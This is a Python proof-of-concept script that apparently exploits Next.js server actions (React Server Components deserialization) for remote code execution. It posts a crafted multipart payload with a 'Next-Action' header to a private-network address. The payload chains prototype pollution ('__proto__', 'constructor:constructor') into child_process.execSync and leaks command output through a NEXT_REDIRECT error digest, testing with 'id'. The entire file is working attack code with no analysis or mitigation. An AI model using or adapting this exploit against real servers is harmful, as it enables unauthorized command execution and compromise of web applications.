import requests, json

url = 'http://10.82.190.47:3000/'

def payload(command):

	pyl = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

	return pyl

def craft_payload(payload):

	return {
    "0": (None, json.dumps(payload)),
    "1": (None, '"$@0"'),
}


headers = {
	
	'Next-Action': 'x'
}


try:

	r = requests.post(url, files=craft_payload(payload('id')), headers=headers)

	print(r.text)

except Exception as e:


	print('[x] Error:', e)
